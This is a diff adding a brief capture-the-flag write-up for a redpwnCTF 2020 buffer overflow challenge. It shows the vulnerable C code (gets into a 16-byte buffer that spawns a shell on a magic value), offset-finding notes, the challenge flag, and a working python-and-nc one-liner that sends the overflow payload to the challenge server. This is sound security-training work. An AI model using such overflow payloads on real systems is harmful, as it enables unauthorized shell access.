@@ -1,0 +1,48 @@
+The coffers keep getting stronger! You'll need to use the source, Luke.
+
+nc 2020.redpwnc.tf 31255
+
+flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
+
+----------------------------------------
+
+long code = 0;
+char name[16];
+
+...
+
+gets(name);
+
+if(code == 0xcafebabe) {
+  system("/bin/sh");
+}
+
+----------------------------------------
+
+
+need cafebabe as well in hex little endian
+
+\xbe\xba\xfe\xca
+
+
+should be similar to previous example, but now need specific value
+
+
+
+16byte char buffer + 8 byte space + long value
+
+
+find the rbp-0x8 part 24 values in 
+
+abcdefghijklmnopqrstuvwxyz0123456789
+
+print (char*)$rbp-0x8
+$2 = 0x7fffffffddc8 "yz0123456789"
+
+Final user input:
+
+not like the first overflow where it immediately went into interactive shell
+had to do it a little different to get it to catch the prompt otherwise it immediately closes
+
+(python -c 'print "a"*24 +"\xbe\xba\xfe\xca"'; cat) | nc 2020.redpwnc.tf 31255
+
